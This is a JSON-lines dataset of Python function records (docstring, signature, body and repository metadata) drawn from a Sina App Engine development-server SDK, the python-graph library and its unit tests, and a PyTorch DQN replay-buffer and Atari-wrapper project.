{"docstring": "'''Deletes a key from the memcache.\n\n@return: Nonzero on success.\n'''\n", "func_signal": "def delete(self, key):\n", "code": "if key not in _cache:\n    return False\ndel _cache[key]\nreturn True", "path": "dev_server\\sae\\kvdb.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Checks sanity of key.  Fails if:\n    Key length is > SERVER_MAX_KEY_LENGTH (Raises MemcachedKeyLength).\n    Contains control characters  (Raises MemcachedKeyCharacterError).\n    Is not a string (Raises MemcachedStringEncodingError)\n    Is an unicode string (Raises MemcachedStringEncodingError)\n    Is not a string (Raises MemcachedKeyError)\n    Is None (Raises MemcachedKeyError)\n\"\"\"\n", "func_signal": "def check_key(self, key, key_extra_len=0):\n", "code": "if isinstance(key, tuple): key = key[1]\nif not key:\n    raise Client.MemcachedKeyNoneError(\"Key is None\")\nif isinstance(key, unicode):\n    raise Client.MemcachedStringEncodingError(\n            \"Keys must be str()'s, not unicode.  Convert your unicode \"\n            \"strings using mystring.encode(charset)!\")\nif not isinstance(key, str):\n    raise Client.MemcachedKeyTypeError(\"Key must be str()'s\")\n\nif isinstance(key, basestring):\n    if self.server_max_key_length != 0 and \\\n        len(key) + key_extra_len > self.server_max_key_length:\n        raise Client.MemcachedKeyLengthError(\"Key length is > %s\"\n                 % self.server_max_key_length)\n    for char in key:\n        if ord(char) < 33 or ord(char) == 127:\n            raise Client.MemcachedKeyCharacterError(\n                    \"Control characters not allowed\")", "path": "dev_server\\sae\\memcache.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "'''\nSets multiple keys in the memcache doing just one query.\n\n>>> notset_keys = mc.set_multi({'key1' : 'val1', 'key2' : 'val2'})\n>>> mc.get_multi(['key1', 'key2']) == {'key1' : 'val1', 'key2' : 'val2'}\n1\n\n\nThis method is recommended over regular L{set} as it lowers the number of\ntotal packets flying around your network, reducing total latency, since\nyour app doesn't have to wait for each round-trip of L{set} before sending\nthe next one.\n\n@param mapping: A dict of key/value pairs to set.\n@param time: Tells memcached the time which this value should expire, either\nas a delta number of seconds, or an absolute unix time-since-the-epoch\nvalue. See the memcached protocol docs section \"Storage Commands\"\nfor more info on <exptime>. We default to 0 == cache forever.\n@param key_prefix:  Optional string to prepend to each key when sending to memcache. Allows you to efficiently stuff these keys into a pseudo-namespace in memcache:\n    >>> notset_keys = mc.set_multi({'key1' : 'val1', 'key2' : 'val2'}, key_prefix='subspace_')\n    >>> len(notset_keys) == 0\n    True\n    >>> mc.get_multi(['subspace_key1', 'subspace_key2']) == {'subspace_key1' : 'val1', 'subspace_key2' : 'val2'}\n    True\n\n    Causes key 'subspace_key1' and 'subspace_key2' to be set. Useful in conjunction with a higher-level layer which applies namespaces to data in memcache.\n    In this case, the return result would be the list of notset original keys, prefix not applied.\n\n@param min_compress_len: The threshold length to kick in auto-compression\nof the value using the zlib.compress() routine. If the value being cached is\na string, then the length of the string is measured, else if the value is an\nobject, then the length of the pickle result is measured. If the resulting\nattempt at compression yeilds a larger string than the input, then it is\ndiscarded. For backwards compatability, this parameter defaults to 0,\nindicating don't ever try to compress.\n@return: List of keys which failed to be stored [ memcache out of memory, etc. ].\n@rtype: list\n\n'''\n", "func_signal": "def set_multi(self, mapping, time=0, key_prefix='', min_compress_len=0):\n", "code": "self._cmd_set += 1\n\nfor key, value in mapping.iteritems():\n    if isinstance(key, basestring):\n        flags = 0\n    else:\n        flags = 1\n    _key = key_prefix + str(key)\n    self.check_key(_key)\n    _cache[_key] = _CacheEntry(value, flags, time)\n\nreturn []", "path": "dev_server\\sae\\memcache.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Initializer.\n\nArgs:\n  name: The name of the taskqueue.\n  auth_token: Optional, a two-element tuple (access_key, secretkey_key),\n    useful when you want to access other application's taskqueue.\n\"\"\"\n", "func_signal": "def __init__(self, name, auth_token=None):\n", "code": "self.name = name\n\nif auth_token: \n    self.accesskey_key, self.secret_key = auth_token\nelse:\n    self.access_key = const.ACCESS_KEY\n    self.secret_key = const.SECRET_KEY", "path": "dev_server\\sae\\taskqueue.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Convert mail mesage to protocol message\"\"\"\n", "func_signal": "def _to_proto(self):\n", "code": "self.check_initialized()\n\nargs = {'from':          getattr(self, 'from_addr', self.smtp[2]),\n        'to':            self.to,\n        'subject':       self.subject,\n        'smtp_host':     self.smtp[0],\n        'smtp_port':     self.smtp[1],\n        'smtp_username': self.smtp[2],\n        'smtp_password': self.smtp[3],\n        'tls':           self.smtp[4]}\n\nsize = 0\n\nif hasattr(self, 'body'):\n    args['content'] = self.body\n    args['content_type'] = 'TEXT'\n    size = size + len(self.body)\nelif hasattr(self, 'html'):\n    args['content'] = self.html\n    args['content_type']  = 'HTML'\n    size = size + len(self.html)\n\nif hasattr(self, 'attachments'):\n    for attachment in self.attachments:\n        ext = attachment[0].split('.')[-1]\n\n        disposition = self._ext_to_disposition.get(ext)\n        if not disposition:\n            raise InvalidAttachmentTypeError()\n\n        key = 'attach:' + attachment[0] + ':B:' + disposition\n        args[key] = base64.encodestring(attachment[1])\n\n        size = size + len(attachment[1])\n\nif size > MAX_EMAIL_SIZE:\n    raise MailTooLargeError()\n\nmessage = {'saemail': json.dumps(args)}\nreturn message", "path": "dev_server\\sae\\mail.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "\"\"\"Sets fields of the email message\n\nArgs:\n  to: The recipient's email address.\n  subject: The subject of the message.\n  body: The content of the message, plain-text only.\n  html: Use this field when you want to send html-encoded message.\n  smtp: This is a five-element tuple of your smtp server's configuration\n    (smtp_host, smtp_port, smtp_username, smtp_password, smtp_tls).\n  attachments: The file attachments of the message, as a list of \n    two-value tuples, one tuple for each attachment. Each tuple contains\n    a filename as the first element, and the file contents as the second\n    element.\n\"\"\"\n", "func_signal": "def initialize(self, **kwargs):\n", "code": "for name, value in kwargs.iteritems():\n    setattr(self, name, value)", "path": "dev_server\\sae\\mail.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "'''Get statistics from each of the servers.\n\n@param stat_args: Additional arguments to pass to the memcache\n    \"stats\" command.\n\n@return: A list of tuples ( server_identifier, stats_dictionary ).\n    The dictionary contains a number of name/value pairs specifying\n    the name of the status field and the string value associated with\n    it.  The values are not converted from strings.\n'''\n\n", "func_signal": "def get_stats(self, stat_args = None):\n", "code": "total_bytes= 0\nfor k, e in _cache.iteritems():\n    total_bytes += len(str(e.value))\n\ncurr_items = len(_cache)\n\nname = '10.67.15.110:9211 (0)'\nstats = {\n    'bytes': str(total_bytes),\n    'bytes_read': '920852',\n    'bytes_written': '3615514',\n    'cmd_get': str(self._cmd_get),\n    'cmd_set': str(self._cmd_set),\n    'connection_structures': '676',\n    'curr_connections': '3',\n    'curr_items': str(curr_items),\n    'evictions': '0',\n    'get_hits': str(self._get_hits),\n    'get_misses': str(self._get_misses),\n    'limit_maxbytes': '1048576',\n    'pid': '24925',\n    'pointer_size': '64',\n    'rusage_system': '38237.950000',\n    'rusage_user': '53464.940000',\n    'threads': '0',\n    'time': str(int(time.time())),\n    'total_connections': '350149607',\n    'total_items': str(curr_items),\n    'uptime': '2541642',\n    'version': '1.4.5'\n}\n\nreturn [(name, stats),]", "path": "dev_server\\sae\\memcache.py", "repo_name": "sinacloud/sae-python-dev-guide", "stars": 465, "license": "None", "language": "python", "size": 1012}
{"docstring": "#set up the graph (see example on wikipedia page for Gomory-Hu tree)\n", "func_signal": "def test_cut_tree(self):\n", "code": "gr = graph()\ngr.add_nodes([0,1,2,3,4,5])\ngr.add_edge((0,1), wt=1)\ngr.add_edge((0,2), wt=7)\ngr.add_edge((1,3), wt=3)\ngr.add_edge((1,2), wt=1)\ngr.add_edge((1,4), wt=2)\ngr.add_edge((2,4), wt=4)\ngr.add_edge((3,4), wt=1)\ngr.add_edge((3,5), wt=6)\ngr.add_edge((4,5), wt=2)\n\nct = cut_tree(gr)\n\n#check ct\nassert ct[(2,0)] == 8\nassert ct[(4,2)] == 6\nassert ct[(1,4)] == 7\nassert ct[(3,1)] == 6\nassert ct[(5,3)] == 8", "path": "tests\\unittests-minmax.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "#testing correctness on the fixture \n", "func_signal": "def test_shortest_path_BF_on_digraph(self):\n", "code": "gr = generate_fixture_digraph()\npre,dist = shortest_path_bellman_ford(gr, 1)\nassert pre == {1: None, 2: 3, 3: 4, 4: 1, 5: 2} \\\n       and dist == {1: 0, 2: 2, 3: 4, 4: 7, 5: -2}", "path": "tests\\unittests-minmax.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nSet the label of an edge.\n\n@type  edge: edge\n@param edge: One edge.\n\n@type  label: string\n@param label: Edge label.\n\"\"\"\n", "func_signal": "def set_edge_label(self, edge, label):\n", "code": "self.set_edge_properties(edge, label=label )\nif not self.DIRECTED:\n    self.set_edge_properties((edge[1], edge[0]) , label=label )", "path": "core\\pygraph\\mixins\\labeling.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "#Test example from wikipedia: http://en.wikipedia.org/wiki/File:Linkstruct3.svg\n", "func_signal": "def test_pagerank(self):\n", "code": "G = digraph()\nG.add_nodes([1, 2, 3, 4, 5, 6, 7])        \nG.add_edge((1, 2))\nG.add_edge((1, 3))\nG.add_edge((1, 4))\nG.add_edge((1, 5))\nG.add_edge((1, 7))\nG.add_edge((2, 1))\nG.add_edge((3, 1))\nG.add_edge((3, 2))\nG.add_edge((4, 2))\nG.add_edge((4, 3))\nG.add_edge((4, 5))\nG.add_edge((5, 1))\nG.add_edge((5, 3))\nG.add_edge((5, 4))\nG.add_edge((5, 6))\nG.add_edge((6, 1))\nG.add_edge((6, 5))\nG.add_edge((7, 5))\nexpected_pagerank = {\n    1: 0.280, \n    2: 0.159,\n    3: 0.139,\n    4: 0.108,\n    5: 0.184,\n    6: 0.061,\n    7: 0.069,\n}\npr = pagerank(G)\nfor k in pr:\n    self.assertAlmostEqual(pr[k], expected_pagerank[k], places=3)", "path": "tests\\unittests-pagerank.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nReturn whether this graph is equal to another one.\n\n@type other: graph, digraph\n@param other: Other graph or digraph\n\n@rtype: boolean\n@return: Whether this graph and the other are equal.\n\"\"\"\n", "func_signal": "def __eq__(self, other):\n", "code": "def attrs_eq(list1, list2):\n    for each in list1:\n        if (each not in list2): return False\n    for each in list2:\n        if (each not in list1): return False\n    return True\n\ndef edges_eq():\n    for edge in self.edges():\n        if (self.edge_weight(edge) != other.edge_weight(edge)): return False\n        if (self.edge_label(edge) != other.edge_label(edge)): return False\n        if (not attrs_eq(self.edge_attributes(edge), other.edge_attributes(edge))): return False \n    return True\n\ndef nodes_eq():\n    for node in self:\n        if (not attrs_eq(self.node_attributes(node), other.node_attributes(node))): return False \n    return True\n\nreturn nodes_eq() and edges_eq()", "path": "core\\pygraph\\mixins\\labeling.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "#Test if all nodes in a cycle graph have the same value\n", "func_signal": "def test_pagerank_cycle(self):\n", "code": "G = digraph()\nG.add_nodes([1, 2, 3, 4, 5])\nG.add_edge((1, 2))\nG.add_edge((2, 3))\nG.add_edge((3, 4))\nG.add_edge((4, 5))\nG.add_edge((5, 1))\nself.assertEqual(pagerank(G), {1: 0.2, 2: 0.2, 3: 0.2, 4: 0.2, 5: 0.2})", "path": "tests\\unittests-pagerank.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nCreate a random hyper graph.\n\n@type  num_nodes: number\n@param num_nodes: Number of nodes.\n\n@type  num_edges: number\n@param num_edges: Number of edges.\n\n@type  r: number\n@param r: Uniform edges of size r.\n\"\"\"\n# Graph creation\n", "func_signal": "def generate_hypergraph(num_nodes, num_edges, r = 0):\n", "code": "random_graph = hypergraph()\n\n# Nodes\nnodes = list(map(str, list(range(num_nodes))))\nrandom_graph.add_nodes(nodes)\n\n# Base edges\nedges = list(map(str, list(range(num_nodes, num_nodes+num_edges))))\nrandom_graph.add_hyperedges(edges)\n\n# Connect the edges\nif 0 == r:\n    # Add each edge with 50/50 probability\n    for e in edges:\n        for n in nodes:\n            if choice([True, False]):\n                random_graph.link(n, e)\n\nelse:\n    # Add only uniform edges\n    for e in edges:\n        # First shuffle the nodes\n        shuffle(nodes)\n        \n        # Then take the first r nodes\n        for i in range(r):\n            random_graph.link(nodes[i], e)\n\nreturn random_graph", "path": "core\\pygraph\\algorithms\\generators.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "# Metadata bout edges\n", "func_signal": "def __init__(self):\n", "code": "self.edge_properties = {}    # Mapping: Edge -> Dict mapping, lablel-> str, wt->num\nself.edge_attr = {}          # Key value pairs: (Edge -> Attributes)\n\n# Metadata bout nodes\nself.node_attr = {}          # Pairing: Node -> Attributes", "path": "core\\pygraph\\mixins\\labeling.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "#graph with a neg. weight cycle\n", "func_signal": "def generate_fixture_digraph_neg_weight_cycle():\n", "code": "G = generate_fixture_digraph()\nG.del_edge((2,4))\nG.add_edge((2,4), 2)#changed\n\nG.add_nodes([100,200]) #unconnected part\nG.add_edge((100,200),2)\nreturn G", "path": "tests\\unittests-minmax.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "# Test stub: not checking for correctness yet\n", "func_signal": "def test_shortest_path_on_digraph(self):\n", "code": "gr = testlib.new_digraph(wt_range=(1,10))\nst, dist = shortest_path(gr, 0)\nfor each in gr:\n    if (each in dist):\n        assert bf_path(gr, 0, each, dist[each])", "path": "tests\\unittests-minmax.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "#test negative weight cycle detection\n", "func_signal": "def test_shortest_path_BF_on_digraph_with_negwcycle(self):\n", "code": "gr = generate_fixture_digraph_neg_weight_cycle()\nself.assertRaises(NegativeWeightCycleError,\n         shortest_path_bellman_ford, gr, 1)", "path": "tests\\unittests-minmax.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nCreate a random graph.\n\n@type  num_nodes: number\n@param num_nodes: Number of nodes.\n\n@type  num_edges: number\n@param num_edges: Number of edges.\n\n@type  directed: bool\n@param directed: Whether the generated graph should be directed or not.  \n\n@type  weight_range: tuple\n@param weight_range: tuple of two integers as lower and upper limits on randomly generated\nweights (uniform distribution).\n\"\"\"\n# Graph creation\n", "func_signal": "def generate(num_nodes, num_edges, directed=False, weight_range=(1, 1)):\n", "code": "if directed:\n    random_graph = digraph()\nelse:\n    random_graph = graph()\n\n# Nodes\nnodes = range(num_nodes)\nrandom_graph.add_nodes(nodes)\n\n# Build a list of all possible edges\nedges = []\nedges_append = edges.append\nfor x in nodes:\n    for y in nodes:\n        if ((directed and x != y) or (x > y)):\n            edges_append((x, y))\n\n# Randomize the list\nshuffle(edges)\n\n# Add edges to the graph\nmin_wt = min(weight_range)\nmax_wt = max(weight_range)\nfor i in range(num_edges):\n    each = edges[i]\n    random_graph.add_edge((each[0], each[1]), wt = randint(min_wt, max_wt))\n\nreturn random_graph", "path": "core\\pygraph\\algorithms\\generators.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nAppend a sequence of attributes to the given edge\n\n@type  edge: edge\n@param edge: One edge.\n\n@type  attrs: tuple\n@param attrs: Node attributes specified as a sequence of tuples in the form (attribute, value).\n\"\"\"\n", "func_signal": "def add_edge_attributes(self, edge, attrs):\n", "code": "for attr in attrs:\n    self.add_edge_attribute(edge, attr)", "path": "core\\pygraph\\mixins\\labeling.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nSet the weight of an edge.\n\n@type  edge: edge\n@param edge: One edge.\n\n@type  wt: number\n@param wt: Edge weight.\n\"\"\"\n", "func_signal": "def set_edge_weight(self, edge, wt):\n", "code": "self.set_edge_properties(edge, weight=wt )\nif not self.DIRECTED:\n    self.set_edge_properties((edge[1], edge[0]) , weight=wt )", "path": "core\\pygraph\\mixins\\labeling.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nAdd attribute to the given edge.\n\n@type  edge: edge\n@param edge: One edge.\n\n@type  attr: tuple\n@param attr: Node attribute specified as a tuple in the form (attribute, value).\n\"\"\"\n", "func_signal": "def add_edge_attribute(self, edge, attr):\n", "code": "self.edge_attr[edge] = self.edge_attributes(edge) + [attr]\n\nif (not self.DIRECTED and edge[0] != edge[1]):\n    self.edge_attr[(edge[1],edge[0])] = self.edge_attributes((edge[1], edge[0])) + [attr]", "path": "core\\pygraph\\mixins\\labeling.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nInitialize the filter.\n\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.graph = None\nself.spanning_tree = None", "path": "core\\pygraph\\algorithms\\filters\\null.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "#Test if an empty dict is returned for an empty graph\n", "func_signal": "def test_pagerank_empty(self):\n", "code": "G = digraph()\nself.assertEqual(pagerank(G), {})", "path": "tests\\unittests-pagerank.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nReturn the attributes of the given edge.\n\n@type  edge: edge\n@param edge: One edge.\n\n@rtype:  list\n@return: List of attributes specified tuples in the form (attribute, value).\n\"\"\"\n", "func_signal": "def edge_attributes(self, edge):\n", "code": "try:\n    return self.edge_attr[edge]\nexcept KeyError:\n    return []", "path": "core\\pygraph\\mixins\\labeling.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"\nConfigure the filter.\n\n@type  graph: graph\n@param graph: Graph.\n\n@type  spanning_tree: dictionary\n@param spanning_tree: Spanning tree.\n\"\"\"\n", "func_signal": "def configure(self, graph, spanning_tree):\n", "code": "self.graph = graph\nself.spanning_tree = spanning_tree", "path": "core\\pygraph\\algorithms\\filters\\null.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "#helper for bellman-ford algorithm\n", "func_signal": "def generate_fixture_digraph():\n", "code": "G = digraph()\nG.add_nodes([1,2,3,4,5])\nG.add_edge((1,2), 6)\nG.add_edge((1,4), 7)\nG.add_edge((2,4), 8)\nG.add_edge((3,2), -2)\nG.add_edge((4,3), -3)\nG.add_edge((2,5), -4)\nG.add_edge((4,5), 9)\nG.add_edge((5,1), 2)\nG.add_edge((5,3), 7)\nreturn G", "path": "tests\\unittests-minmax.py", "repo_name": "pmatiello/python-graph", "stars": 272, "license": "other", "language": "python", "size": 947}
{"docstring": "\"\"\"Make end-of-life == end-of-episode, but only reset on true game over.\nDone by DeepMind for the DQN and co. since it helps value estimation.\n\"\"\"\n", "func_signal": "def __init__(self, env=None):\n", "code": "super(EpisodicLifeEnv, self).__init__(env)\nself.lives = 0\nself.was_real_done  = True\nself.was_real_reset = False", "path": "utils\\atari_wrappers.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Store a single frame in the buffer at the next available index, overwriting\nold frames if necessary.\nParameters\n----------\nframe: np.array\n    Array of shape (img_h, img_w, img_c) and dtype np.uint8\n    the frame to be stored\nReturns\n-------\nidx: int\n    Index at which the frame is stored. To be used for `store_effect` later.\n\"\"\"\n# if observation is an image...\n", "func_signal": "def store_frame(self, frame):\n", "code": "if len(frame.shape) > 1:\n    # transpose image frame into c, h, w instead of h, w, c\n    frame = frame.transpose(2, 0, 1)\n\nif self.obs is None:\n    self.obs      = np.empty([self.size] + list(frame.shape), dtype=np.uint8)\n    self.action   = np.empty([self.size],                     dtype=np.int32)\n    self.reward   = np.empty([self.size],                     dtype=np.float32)\n    self.done     = np.empty([self.size],                     dtype=np.bool)\nself.obs[self.next_idx] = frame\n\nret = self.next_idx\nself.next_idx = (self.next_idx + 1) % self.size\nself.num_in_buffer = min(self.size, self.num_in_buffer + 1)\n\nreturn ret", "path": "utils\\replay_buffer.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Linear interpolation between initial_p and final_p over\nschedule_timesteps. After this many timesteps pass final_p is\nreturned.\nParameters\n----------\nschedule_timesteps: int\n    Number of timesteps for which to linearly anneal initial_p\n    to final_p\ninitial_p: float\n    initial output value\nfinal_p: float\n    final output value\n\"\"\"\n", "func_signal": "def __init__(self, schedule_timesteps, final_p, initial_p=1.0):\n", "code": "self.schedule_timesteps = schedule_timesteps\nself.final_p            = final_p\nself.initial_p          = initial_p", "path": "utils\\schedules.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"See Schedule.value\"\"\"\n", "func_signal": "def value(self, t):\n", "code": "for (l_t, l), (r_t, r) in zip(self._endpoints[:-1], self._endpoints[1:]):\n    if l_t <= t and t < r_t:\n        alpha = float(t - l_t) / (r_t - l_t)\n        return self._interpolation(l, r, alpha)\n\n# t does not belong to any of the pieces, so doom.\nassert self._outside_value is not None\nreturn self._outside_value", "path": "utils\\schedules.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Sample `batch_size` different transitions.\ni-th sample transition is the following:\nwhen observing `obs_batch[i]`, action `act_batch[i]` was taken,\nafter which reward `rew_batch[i]` was received and subsequent\nobservation  next_obs_batch[i] was observed, unless the epsiode\nwas done which is represented by `done_mask[i]` which is equal\nto 1 if episode has ended as a result of that action.\nParameters\n----------\nbatch_size: int\n    How many transitions to sample.\nReturns\n-------\nobs_batch: np.array\n    Array of shape\n    (batch_size, img_c * frame_history_len, img_h, img_w)\n    and dtype np.uint8\nact_batch: np.array\n    Array of shape (batch_size,) and dtype np.int32\nrew_batch: np.array\n    Array of shape (batch_size,) and dtype np.float32\nnext_obs_batch: np.array\n    Array of shape\n    (batch_size, img_c * frame_history_len, img_h, img_w)\n    and dtype np.uint8\ndone_mask: np.array\n    Array of shape (batch_size,) and dtype np.float32\n\"\"\"\n", "func_signal": "def sample(self, batch_size):\n", "code": "assert self.can_sample(batch_size)\nidxes = sample_n_unique(lambda: random.randint(0, self.num_in_buffer - 2), batch_size)\nreturn self._encode_sample(idxes)", "path": "utils\\replay_buffer.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Helper function. Given a function `sampling_f` that returns\ncomparable objects, sample n such unique objects.\n\"\"\"\n", "func_signal": "def sample_n_unique(sampling_f, n):\n", "code": "res = []\nwhile len(res) < n:\n    candidate = sampling_f()\n    if candidate not in res:\n        res.append(candidate)\nreturn res", "path": "utils\\replay_buffer.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"This is a memory efficient implementation of the replay buffer.\nThe sepecific memory optimizations use here are:\n    - only store each frame once rather than k times\n      even if every observation normally consists of k last frames\n    - store frames as np.uint8 (actually it is most time-performance\n      to cast them back to float32 on GPU to minimize memory transfer\n      time)\n    - store frame_t and frame_(t+1) in the same buffer.\nFor the tipical use case in Atari Deep RL buffer with 1M frames the total\nmemory footprint of this buffer is 10^6 * 84 * 84 bytes ~= 7 gigabytes\nWarning! Assumes that returning frame of zeros at the beginning\nof the episode, when there is less frames than `frame_history_len`,\nis acceptable.\nParameters\n----------\nsize: int\n    Max number of transitions to store in the buffer. When the buffer\n    overflows the old memories are dropped.\nframe_history_len: int\n    Number of memories to be retried for each observation.\n\"\"\"\n", "func_signal": "def __init__(self, size, frame_history_len):\n", "code": "self.size = size\nself.frame_history_len = frame_history_len\n\nself.next_idx      = 0\nself.num_in_buffer = 0\n\nself.obs      = None\nself.action   = None\nself.reward   = None\nself.done     = None", "path": "utils\\replay_buffer.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Log a scalar variable.\"\"\"\n", "func_signal": "def scalar_summary(self, tag, value, step):\n", "code": "summary = tf.Summary(value=[tf.Summary.Value(tag=tag, simple_value=value)])\nself.writer.add_summary(summary, step)", "path": "logger.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Sample initial states by taking random number of no-ops on reset.\nNo-op is assumed to be action 0.\n\"\"\"\n", "func_signal": "def __init__(self, env=None, noop_max=30):\n", "code": "super(NoopResetEnv, self).__init__(env)\nself.noop_max = noop_max\nassert env.unwrapped.get_action_meanings()[0] == 'NOOP'", "path": "utils\\atari_wrappers.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Log a histogram of the tensor of values.\"\"\"\n\n# Create a histogram using numpy\n", "func_signal": "def histo_summary(self, tag, values, step, bins=1000):\n", "code": "counts, bin_edges = np.histogram(values, bins=bins)\n\n# Fill the fields of the histogram proto\nhist = tf.HistogramProto()\nhist.min = float(np.min(values))\nhist.max = float(np.max(values))\nhist.num = int(np.prod(values.shape))\nhist.sum = float(np.sum(values))\nhist.sum_squares = float(np.sum(values**2))\n\n# Drop the start of the first bin\nbin_edges = bin_edges[1:]\n\n# Add bin edges and counts\nfor edge in bin_edges:\n    hist.bucket_limit.append(edge)\nfor c in counts:\n    hist.bucket.append(c)\n\n# Create and write Summary\nsummary = tf.Summary(value=[tf.Summary.Value(tag=tag, histo=hist)])\nself.writer.add_summary(summary, step)\nself.writer.flush()", "path": "logger.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Piecewise schedule.\nendpoints: [(int, int)]\n    list of pairs `(time, value)` meanining that schedule should output\n    `value` when `t==time`. All the values for time must be sorted in\n    an increasing order. When t is between two times, e.g. `(time_a, value_a)`\n    and `(time_b, value_b)`, such that `time_a <= t < time_b` then value outputs\n    `interpolation(value_a, value_b, alpha)` where alpha is a fraction of\n    time passed between `time_a` and `time_b` for time `t`.\ninterpolation: lambda float, float, float: float\n    a function that takes value to the left and to the right of t according\n    to the `endpoints`. Alpha is the fraction of distance from left endpoint to\n    right endpoint that t has covered. See linear_interpolation for example.\noutside_value: float\n    if the value is requested outside of all the intervals sepecified in\n    `endpoints` this value is returned. If None then AssertionError is\n    raised when outside value is requested.\n\"\"\"\n", "func_signal": "def __init__(self, endpoints, interpolation=linear_interpolation, outside_value=None):\n", "code": "idxes = [e[0] for e in endpoints]\nassert idxes == sorted(idxes)\nself._interpolation = interpolation\nself._outside_value = outside_value\nself._endpoints      = endpoints", "path": "utils\\schedules.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Store effects of action taken after obeserving frame stored\nat index idx. The reason `store_frame` and `store_effect` is broken\nup into two functions is so that once can call `encode_recent_observation`\nin between.\nParamters\n---------\nidx: int\n    Index in buffer of recently observed frame (returned by `store_frame`).\naction: int\n    Action that was performed upon observing this frame.\nreward: float\n    Reward that was received when the actions was performed.\ndone: bool\n    True if episode was finished after performing that action.\n\"\"\"\n", "func_signal": "def store_effect(self, idx, action, reward, done):\n", "code": "self.action[idx] = action\nself.reward[idx] = reward\nself.done[idx]   = done", "path": "utils\\replay_buffer.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Take action on reset for environments that are fixed until firing.\"\"\"\n", "func_signal": "def __init__(self, env=None):\n", "code": "super(FireResetEnv, self).__init__(env)\nassert env.unwrapped.get_action_meanings()[1] == 'FIRE'\nassert len(env.unwrapped.get_action_meanings()) >= 3", "path": "utils\\atari_wrappers.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
{"docstring": "\"\"\"Return the most recent `frame_history_len` frames.\nReturns\n-------\nobservation: np.array\n    Array of shape (img_c * frame_history_len, img_h, img_w)\n    and dtype np.uint8, where observation[i*img_c:(i+1)*img_c, :, :]\n    encodes frame at time `t - frame_history_len + i`\n\"\"\"\n", "func_signal": "def encode_recent_observation(self):\n", "code": "assert self.num_in_buffer > 0\nreturn self._encode_observation((self.next_idx - 1) % self.size)", "path": "utils\\replay_buffer.py", "repo_name": "dxyang/DQN_pytorch", "stars": 338, "license": "None", "language": "python", "size": 2897}
